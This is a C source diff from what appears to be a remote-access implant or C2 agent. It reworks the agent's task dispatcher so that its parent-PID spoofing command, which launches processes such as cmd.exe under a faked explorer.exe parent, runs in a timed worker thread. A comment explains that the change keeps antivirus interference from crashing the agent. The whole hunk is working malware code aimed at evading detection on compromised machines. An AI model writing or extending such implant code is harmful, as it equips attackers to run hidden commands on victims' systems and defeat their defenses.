@@ -366,15 +366,40 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id, buf, "");
     }
     else if (strcmp(type_upper, "PPID") == 0) {
-        /* args JSON: {"cmd":"notepad.exe","parent":"explorer.exe"} */
+        /* args JSON: {"cmd":"notepad.exe","parent":"explorer.exe"}
+         * Runs in a thread with 10 s timeout so an AV-induced hang or SEH
+         * exception inside CreateProcessW cannot kill the main dispatcher. */
         char cmd[512] = {0}, parent[128] = "explorer.exe";
         const char *p = strstr(args, "\"cmd\"");
         if (p) { p = strchr(p+5,'"'); if(p){p++; size_t i=0; while(*p&&*p!='"'&&i<511) cmd[i++]=*p++; cmd[i]='\0'; } }
         p = strstr(args, "\"parent\"");
         if (p) { p = strchr(p+8,'"'); if(p){p++; size_t i=0; while(*p&&*p!='"'&&i<127) parent[i++]=*p++; parent[i]='\0'; } }
         if (!cmd[0]) strncpy(cmd, "cmd.exe", sizeof(cmd)-1);
-        if (spawn_with_ppid(cmd, parent)) agent_send_result(task->id, "[+] spawned", "");
-        else { char err[128]; snprintf(err,sizeof(err),"ppid: failed (err %lu)",GetLastError()); agent_send_result(task->id,"",err); }
+
+        PpidWork *work = (PpidWork *)calloc(1, sizeof(PpidWork));
+        if (!work) { agent_send_result(task->id, "", "ppid: alloc failed"); }
+        else {
+            strncpy(work->cmd,    cmd,    sizeof(work->cmd)    - 1);
+            strncpy(work->parent, parent, sizeof(work->parent) - 1);
+            HANDLE hTh = CreateThread(NULL, 0, ppid_worker, work, 0, NULL);
+            if (!hTh) {
+                free(work);
+                agent_send_result(task->id, "", "ppid: thread failed");
+            } else {
+                DWORD waited = WaitForSingleObject(hTh, 10000);
+                CloseHandle(hTh);
+                if (waited == WAIT_TIMEOUT) {
+                    /* Thread leaked intentionally — may still be in CreateProcessW */
+                    agent_send_result(task->id, "", "ppid: timed out");
+                } else {
+                    int ok = work->ok;
+                    free(work);
+                    if      (ok ==  1) agent_send_result(task->id, "[+] spawned", "");
+                    else if (ok == -2) agent_send_result(task->id, "", "ppid: exception in spawn");
+                    else { char err[64]; snprintf(err,sizeof(err),"ppid: failed (err %lu)",GetLastError()); agent_send_result(task->id,"",err); }
+                }
+            }
+        }
     }
     else if (strcmp(type_upper, "CONFIG") == 0) {
         /* args JSON: {"sleep_sec":N,"jitter_pct":N,"working_hours":"HH:MM-HH:MM"} */
